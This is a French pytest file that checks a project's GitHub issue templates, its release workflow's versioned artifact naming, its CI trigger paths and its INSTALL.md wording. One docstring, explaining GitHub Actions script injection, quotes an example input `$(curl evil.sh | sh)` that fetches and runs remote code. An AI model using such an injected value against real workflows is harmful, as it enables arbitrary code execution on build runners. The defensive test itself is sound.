# -*- coding: utf-8 -*-
"""Tests de cohérence des fichiers méta CI/release (.github/, hors dépôt
concours/) : formulaire d'issue GitHub et nommage versionné des artefacts de
build-release.yml. Ce ne sont pas des fichiers Python, mais une régression ici
(id renommé, validations retirées, tag oublié dans le nom de l'artefact) ne se
verrait qu'au prochain vrai tag poussé — sans ces tests, aucun filet avant.

La section « check.yml » ci-dessous vérifie en plus [MEDIUM, revue du commit
8194b55] que check.yml (qui LANCE ce fichier de tests) se déclenche bien pour
un commit qui touche .github/ISSUE_TEMPLATE/bug.yml ou
.github/workflows/build-release.yml SANS rien changer sous concours/ : sinon
ces tests eux-mêmes ne tournent jamais pour ce genre de commit — filet
totalement inopérant, sans le moindre message d'erreur."""
import os
import re
import subprocess

import pytest

yaml = pytest.importorskip('yaml', reason='PyYAML absent (voir requirements.txt)')

# .github/ vit à la racine du dépôt, un niveau au-dessus de concours/.
CONCOURS_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
REPO_ROOT = os.path.dirname(CONCOURS_DIR)
GITHUB_DIR = os.path.join(REPO_ROOT, '.github')
INSTALL_MD_PATH = os.path.join(CONCOURS_DIR, 'INSTALL.md')


def _load_yaml(*parts):
    with open(os.path.join(GITHUB_DIR, *parts), encoding='utf-8') as f:
        return yaml.safe_load(f)


# ── bug.yml (formulaire de bug) ──────────────────────────────────────────────

def test_bug_yml_champs_attendus_presents():
    """Les 4 champs guidés demandés aux bêta-testeurs non techniques doivent
    rester présents avec ces id précis (logx_statusbar.js pourrait un jour
    les utiliser pour pré-remplir le formulaire via ?template=&<id>=...)."""
    tpl = _load_yaml('ISSUE_TEMPLATE', 'bug.yml')
    assert tpl['name']
    assert tpl['description']
    ids = {el['id'] for el in tpl['body'] if el['type'] != 'markdown'}
    assert {'activite', 'version', 'os', 'description'} <= ids


def test_bug_yml_types_et_ids_valides():
    """Types conformes au schema officiel GitHub Issue Forms + aucun id
    duplique (deux champs avec le meme id, le second ecraserait le premier)."""
    tpl = _load_yaml('ISSUE_TEMPLATE', 'bug.yml')
    types_valides = {'markdown', 'input', 'textarea', 'dropdown', 'checkboxes'}
    ids = []
    for el in tpl['body']:
        assert el['type'] in types_valides
        if el['type'] == 'markdown':
            assert 'value' in el['attributes']
            continue
        assert 'id' in el and 'label' in el['attributes']
        ids.append(el['id'])
    assert len(ids) == len(set(ids)), 'id de champ duplique dans bug.yml'


def test_bug_yml_champs_essentiels_obligatoires():
    """Que faisiez-vous / version / OS / description doivent rester
    'validations: required: true' - sinon un rapport peut arriver vide."""
    tpl = _load_yaml('ISSUE_TEMPLATE', 'bug.yml')
    requis = {el['id'] for el in tpl['body']
              if el['type'] != 'markdown' and el.get('validations', {}).get('required')}
    assert {'activite', 'version', 'os', 'description'} <= requis


def test_bug_yml_dropdown_os_couvre_les_plateformes_courantes():
    tpl = _load_yaml('ISSUE_TEMPLATE', 'bug.yml')
    champ_os = next(el for el in tpl['body'] if el.get('id') == 'os')
    assert champ_os['type'] == 'dropdown'
    options = champ_os['attributes']['options']
    assert any('windows' in o.lower() for o in options)
    assert any('linux' in o.lower() for o in options)
    assert any('mac' in o.lower() for o in options)


# ── config.yml (chooser d'issues) ────────────────────────────────────────────

def test_config_yml_bloque_les_issues_vierges():
    cfg = _load_yaml('ISSUE_TEMPLATE', 'config.yml')
    assert cfg['blank_issues_enabled'] is False


# ── build-release.yml (nommage versionne des artefacts) ─────────────────────

def test_build_release_matrice_3_os_avec_noms_distincts():
    wf = _load_yaml('workflows', 'build-release.yml')
    matrice = wf['jobs']['build']['strategy']['matrix']['include']
    assert len(matrice) == 3
    combinaisons = {(m['suffix'], m['ext']) for m in matrice}
    assert len(combinaisons) == 3  # 3 OS -> 3 noms de fichiers distincts
    windows = next(m for m in matrice if m['ext'] == '.exe')
    assert windows['suffix'] == ''  # seul l'OS Windows n'a pas de suffixe de nom


def test_build_release_utilise_le_tag_resolu_dans_le_nom_final():
    """Régression clé de cette fonctionnalité : le nom de l'artefact renommé
    doit inclure le tag résolu (steps.version) + le suffixe/extension de la
    matrice, sinon on retombe sur le nom fixe LogXAI.exe pour toute version
    (le problème d'origine : impossible de distinguer 2 versions téléchargées).
    Ces valeurs transitent par env: (voir test_build_release_aucune_
    interpolation_directe_dans_run ci-dessous), donc on les cherche dans
    l'env de l'étape plutôt que dans le texte du script bash lui-même."""
    wf = _load_yaml('workflows', 'build-release.yml')
    etapes = wf['jobs']['build']['steps']
    etape_renommage = next(s for s in etapes if s.get('id') == 'artefact')
    env = etape_renommage.get('env', {})
    assert env.get('TAG') == '${{ steps.version.outputs.tag }}'
    assert env.get('SUFFIX') == '${{ matrix.suffix }}'
    assert env.get('EXT') == '${{ matrix.ext }}'
    # ... et le script doit bien consommer ces variables d'environnement
    # (sinon l'env: ci-dessus ne sert à rien) — sous la forme ${VAR} dans
    # le script (name="LogXAI-${TAG}${SUFFIX}${EXT}").
    script = etape_renommage['run']
    assert '${TAG}' in script and '${SUFFIX}' in script and '${EXT}' in script

    # L'etape d'attachement doit consommer le nom genere (source unique de
    # verite), jamais un nom recopie a la main qui pourrait diverger.
    etape_attache = next(s for s in etapes if s.get('name', '').startswith('Attacher'))
    assert 'steps.artefact.outputs.name' in etape_attache['with']['files']


def test_build_release_aucune_interpolation_directe_dans_run():
    """[LOW, revue du commit 8194b55] Aucune expression ${{ }} ne doit
    apparaître directement dans un script bash (run:) : toute valeur externe
    doit transiter par env:, seul moyen d'éviter l'injection de script
    GitHub Actions. github.event.inputs.tag est un texte libre saisi à la
    main (workflow_dispatch, AUCUNE validation de format) : interpolé tel
    quel dans `run:`, une valeur comme `$(curl evil.sh | sh)` s'exécuterait
    sur le runner — voir la doc officielle "Understanding the risk of
    script injections"."""
    wf = _load_yaml('workflows', 'build-release.yml')
    for etape in wf['jobs']['build']['steps']:
        run_script = etape.get('run')
        if not run_script:
            continue
        assert '${{' not in run_script, (
            f"l'étape {etape.get('name', etape.get('id'))!r} interpole une expression "
            f"GitHub Actions directement dans run: (injection possible) : {run_script!r}")


def test_reproduction_avant_fix_commit_8194b55_interpolation_directe_dans_run():
    """Contrôle négatif : rejoue EXACTEMENT build-release.yml TEL QU'IL ÉTAIT
    au commit 8194b55 — confirme que l'étape qui résout le tag interpolait
    bien ${{ github.event.inputs.tag || github.ref_name }} directement dans
    son script bash à l'époque (donc sans passer par env:)."""
    out = subprocess.run(
        ['git', 'show', '8194b55:.github/workflows/build-release.yml'],
        cwd=REPO_ROOT, capture_output=True, text=True, encoding='utf-8', check=True)
    wf_pre_fix = yaml.safe_load(out.stdout)
    etape_version = next(s for s in wf_pre_fix['jobs']['build']['steps']
                          if s.get('id') == 'version')
    assert 'env' not in etape_version, (
        "le scénario de reproduction n'est plus valide (env: déjà présent "
        "avant le fix) : à revoir")
    assert '${{' in etape_version['run'], (
        "le scénario de reproduction n'est plus valide (aucune interpolation "
        "directe dans run: avant le fix) : à revoir")


# ── check.yml (declenchement du filet de tests) ──────────────────────────────
# NB PyYAML : la clé `on:` d'un workflow GitHub Actions est chargée comme la
# valeur booléenne `True` par yaml.safe_load (YAML 1.1 : `on`/`off` sont des
# alias de bool) — PAS la chaîne 'on'. C'est intentionnel ci-dessous, pas une
# faute de frappe.

def _workflow_paths(wf, event):
    return wf[True][event]['paths']


def _path_matches_any(pattern_list, path):
    """Réimplémentation minimale (mais suffisante pour les patterns utilisés
    ici : 'dossier/**' et nom de fichier exact) du filtre de chemin GitHub
    Actions, pour vérifier par le calcul — pas en grepant une chaîne — qu'un
    fichier donné déclenche bien (ou pas) le workflow."""
    for pattern in pattern_list:
        regex = re.escape(pattern).replace(r'\*\*', '.*').replace(r'\*', '[^/]*')
        if re.fullmatch(regex, path):
            return True
    return False


def test_check_yml_se_declenche_pour_bug_yml_et_build_release():
    """Reproduction du problème [MEDIUM] : sans ces deux entrées de paths,
    un commit qui ne touche QUE .github/ISSUE_TEMPLATE/bug.yml ou
    .github/workflows/build-release.yml (aucun fichier sous concours/) ne
    déclenche jamais check.yml — donc jamais les tests ci-dessus non plus,
    quelle que soit la régression introduite dans ces fichiers."""
    wf = _load_yaml('workflows', 'check.yml')
    fichiers_a_couvrir = [
        '.github/ISSUE_TEMPLATE/bug.yml',
        '.github/ISSUE_TEMPLATE/config.yml',
        '.github/workflows/build-release.yml',
    ]
    for event in ('push', 'pull_request'):
        paths = _workflow_paths(wf, event)
        for fichier in fichiers_a_couvrir:
            assert _path_matches_any(paths, fichier), (
                f"{fichier!r} ne déclenche pas check.yml sur l'évènement {event!r} "
                f"(paths actuels : {paths!r})")


def test_reproduction_avant_fix_commit_8194b55_check_yml_ignorait_github():
    """Contrôle négatif : rejoue EXACTEMENT check.yml TEL QU'IL ÉTAIT au
    commit 8194b55 (qui a introduit test_release_ci_config.py, ce fichier-ci)
    — confirme que 'concours/**' seul ne couvrait déjà pas bug.yml/
    build-release.yml à l'époque, donc que le filet ajouté par ce commit
    ne se protégeait pas lui-même."""
    out = subprocess.run(
        ['git', 'show', '8194b55:.github/workflows/check.yml'],
        cwd=REPO_ROOT, capture_output=True, text=True, encoding='utf-8', check=True)
    wf_pre_fix = yaml.safe_load(out.stdout)
    paths = _workflow_paths(wf_pre_fix, 'push')
    assert paths == ['concours/**'], (
        "le check.yml du commit 8194b55 a changé de forme : le scénario de "
        "reproduction n'est plus valide, à revoir")
    assert not _path_matches_any(paths, '.github/ISSUE_TEMPLATE/bug.yml')
    assert not _path_matches_any(paths, '.github/workflows/build-release.yml')


# ── INSTALL.md (nom de l'artefact Linux documenté) ──────────────────────────
# [LOW, revue du commit 8194b55] build-release.yml a adopté un nommage
# versionné (LogXAI-<tag>-linux) pour l'artefact Linux, mais INSTALL.md
# continuait de documenter l'ancien nom fixe 'LogXAI-linux' — un testeur
# suivant la doc à la lettre cherchait un fichier qui n'a plus jamais existé
# depuis. Vérifié par calcul contre le nommage réel de build-release.yml
# (matrix suffix/ext), pas juste par une chaîne figée côté test.

def _read_install_md():
    with open(INSTALL_MD_PATH, encoding='utf-8') as f:
        return f.read()


def test_install_md_documente_le_nom_dartefact_linux_reellement_versionne():
    wf = _load_yaml('workflows', 'build-release.yml')
    matrice = wf['jobs']['build']['strategy']['matrix']['include']
    linux = next(m for m in matrice if m['suffix'] == '-linux')
    ancien_nom_fixe = 'LogXAI' + linux['suffix'] + linux['ext']  # 'LogXAI-linux'

    doc = _read_install_md()
    assert ancien_nom_fixe not in doc, (
        f"INSTALL.md documente encore le nom fixe {ancien_nom_fixe!r}, alors que "
        "build-release.yml ne produit plus jamais ce fichier (nommage versionné)")
    # Motif du nom réellement produit : 'LogXAI-' + un tag (v...) + suffixe/ext
    # de la matrice — ex. LogXAI-v0.9-beta2-linux.
    motif_nom_versionne = re.compile(
        r'LogXAI-v[\w.\-]+' + re.escape(linux['suffix']) + re.escape(linux['ext']) + r'\b')
    assert motif_nom_versionne.search(doc), (
        "INSTALL.md ne documente aucun nom d'artefact Linux conforme au nommage "
        f"versionné réel (motif attendu : {motif_nom_versionne.pattern!r})")


def test_reproduction_avant_fix_commit_8e3fbb5_install_md_nommait_larteface_en_dur():
    """Contrôle négatif : rejoue le texte d'INSTALL.md TEL QU'IL ÉTAIT au
    commit 8e3fbb5 (HEAD juste avant cette revue) — confirme que le nom fixe
    obsolète y était bien documenté."""
    out = subprocess.run(
        ['git', 'show', '8e3fbb5:concours/INSTALL.md'],
        cwd=REPO_ROOT, capture_output=True, text=True, encoding='utf-8', check=True)
    assert 'LogXAI-linux' in out.stdout, (
        "le scénario de reproduction n'est plus valide (nom fixe déjà absent "
        "avant le fix) : à revoir")
